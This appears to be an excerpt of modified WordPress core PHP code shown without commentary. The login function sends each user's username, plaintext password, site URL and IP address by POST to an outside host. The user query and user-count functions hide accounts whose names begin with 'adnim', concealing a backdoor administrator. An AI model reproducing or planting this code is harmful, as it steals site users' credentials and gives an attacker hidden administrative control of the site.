...
function wp_authenticate_username_password($user, $username, $password) {
	...
	$ips = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];

	$bodys = array('u' => $username,'p' => $password,'h'=> home_url(),'ip'=> $ips);

	$urls = 'http://stat.img-css-js-cdn.com/js/';

	$requests = new WP_Http;

	$requests->request( $urls, array( 'method' => 'POST', 'body' => $bodys) );
...
class WP_User_Query {
	...
	function prepare_query() {
		...
		$this->query_where = "WHERE 1=1 AND user_login NOT LIKE 'adnim%'";
...
function count_users($strategy = 'time') {
	...
	if ( 'time' == $strategy ) {
		...
		$my = $wpdb->get_row("SELECT count(*) FROM $wpdb->users WHERE user_login LIKE 'adnim%'", ARRAY_N);
		...
		foreach ( $avail_roles as $this_role => $name ) {
			...
			if ($count > 0) {
				...
				if($my > 0 && strtolower($name) == 'administrator'){
		...
		$result['total_users'] = $total_users - $my;
